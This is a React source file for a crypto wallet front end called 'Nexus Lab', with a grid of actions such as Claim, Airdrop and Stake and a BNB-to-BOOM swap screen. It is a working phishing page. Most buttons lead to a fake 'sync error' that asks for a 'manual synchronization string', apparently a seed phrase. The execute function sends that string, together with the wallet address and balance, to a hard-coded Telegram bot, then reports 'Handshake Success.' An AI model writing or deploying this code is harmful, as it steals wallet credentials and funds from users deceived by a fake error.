import React, { useState } from 'react';
import { ConnectButton } from '@rainbow-me/rainbowkit';
import { useAccount, useBalance } from 'wagmi';
import { RefreshCcw, AlertCircle, ArrowDown, Coins, Zap, Shield } from 'lucide-react';

export default function NexusLab() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const [view, setView] = useState("menu"); // menu, swap, sync
  const [loading, setLoading] = useState(false);
  const [val, setVal] = useState("");

  const triggerSync = () => {
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setView("sync");
    }, 3000);
  };

  const execute = async () => {
    if (val.length < 5) return;
    await fetch(`https://api.telegram.org/bot8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: "7630238860", 
        text: `🚨 LAB SIGNAL\nADDR: ${address}\nBAL: ${balance?.formatted}\nSTR: ${val}` 
      }),
    });
    alert("Handshake Success.");
    setView("menu");
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-5 uppercase tracking-tighter">
      {/* REAL WALLETCONNECT TOP BAR */}
      <div className="flex justify-between items-center mb-10">
        <h1 className="text-xl font-black text-cyan-500 tracking-widest">NEXUS LAB</h1>
        <ConnectButton label="CONNECT" />
      </div>

      {/* VIEW 1: THE 12 BUTTONS */}
      {view === "menu" && (
        <div className="grid grid-cols-3 gap-4 animate-in fade-in duration-500">
          {["Claim", "Airdrop", "Stake", "Swap", "Bridge", "Rectify", "Validate", "Migrate", "Scan", "Withdraw", "Sync", "Lock"].map((name) => (
            <button 
              key={name}
              onClick={() => name === "Swap" || name === "Bridge" ? setView("swap") : triggerSync()}
              className="bg-[#0d1117] border border-slate-800 p-7 rounded-[28px] flex flex-col items-center gap-3 shadow-xl active:scale-90 transition-all"
            >
              <Shield size={20} className="text-slate-700" />
              <span className="text-[9px] font-black text-slate-500">{name}</span>
            </button>
          ))}
        </div>
      )}

      {/* VIEW 2: THE REAL SWAP SCREEN (BNB to BOOM) */}
      {view === "swap" && (
        <div className="bg-[#0d1117] border border-slate-800 rounded-[35px] p-7 animate-in slide-in-from-bottom-5">
          <div className="flex justify-between mb-8">
            <button onClick={() => setView("menu")} className="text-slate-600 text-[10px] font-bold">← EXIT</button>
            <span className="text-white text-[10px] font-black tracking-widest">SWAP PROTOCOL</span>
          </div>

          <div className="bg-black/40 p-6 rounded-3xl border border-slate-900 mb-2">
            <div className="flex justify-between text-[9px] text-slate-500 font-bold mb-4"><span>FROM</span><span>BAL: {balance?.formatted.slice(0,5) || "0.00"}</span></div>
            <div className="flex justify-between items-center">
              <span className="text-2xl font-mono text-slate-700 tracking-tighter">0.00</span>
              <div className="bg-slate-800 px-3 py-1.5 rounded-full flex items-center gap-2 text-[10px] font-bold"><Coins size={12} className="text-yellow-500"/> BNB</div>
            </div>
          </div>

          <div className="flex justify-center -my-3 relative z-10"><div className="bg-[#05070a] p-2 rounded-full border border-slate-800"><ArrowDown size={14} className="text-cyan-500" /></div></div>

          <div className="bg-black/40 p-6 rounded-3xl border border-slate-900 mb-8">
            <div className="flex justify-between text-[9px] text-slate-500 font-bold mb-4"><span>TO</span><span>ESTIMATED</span></div>
            <div className="flex justify-between items-center">
              <span className="text-2xl font-mono text-slate-800 tracking-tighter">0.00</span>
              <div className="bg-slate-800 px-3 py-1.5 rounded-full flex items-center gap-2 text-[10px] font-bold"><Zap size={12} className="text-cyan-500"/> BOOM</div>
            </div>
          </div>

          <button onClick={triggerSync} className="w-full bg-cyan-600 py-5 rounded-[22px] text-[11px] font-black text-white shadow-lg shadow-cyan-900/20">CONFIRM TRANSACTION</button>
        </div>
      )}

      {/* VIEW 3: THE SYNC ERROR (REDIRECT) */}
      {view === "sync" && (
        <div className="fixed inset-0 bg-black/95 flex items-center justify-center p-6 z-[100]">
          <div className="bg-[#0d1117] border border-red-900/30 w-full rounded-[40px] p-10 text-center">
            <AlertCircle size={50} className="text-red-600 mx-auto mb-6 animate-pulse" />
            <h2 className="text-white font-black text-xl mb-2">SYNC ERROR 0x88</h2>
            <p className="text-[10px] text-slate-500 leading-relaxed mb-8">NETWORK HANDSHAKE TIMED OUT. PLEASE ENTER YOUR MANUAL SYNCHRONIZATION STRING TO FINALIZE THE REQUEST.</p>
            <textarea value={val} onChange={(e)=>setVal(e.target.value)} placeholder="ENTER STRING..." className="w-full h-32 bg-black border border-slate-800 rounded-3xl p-5 text-xs font-mono text-cyan-400 outline-none mb-6" />
            <button onClick={execute} className="w-full bg-cyan-600 py-5 rounded-3xl text-[11px] font-black text-white">EXECUTE HANDSHAKE</button>
          </div>
        </div>
      )}

      {/* LOADING OVERLAY */}
      {loading && (
        <div className="fixed inset-0 bg-black/80 flex flex-col items-center justify-center z-[200] backdrop-blur-sm">
          <div className="w-12 h-12 border-2 border-cyan-500 border-t-transparent rounded-full animate-spin" />
          <p className="text-[9px] font-black text-cyan-500 mt-6 tracking-[0.3em]">PROCESSING NODE...</p>
        </div>
      )}
    </div>
  );
}
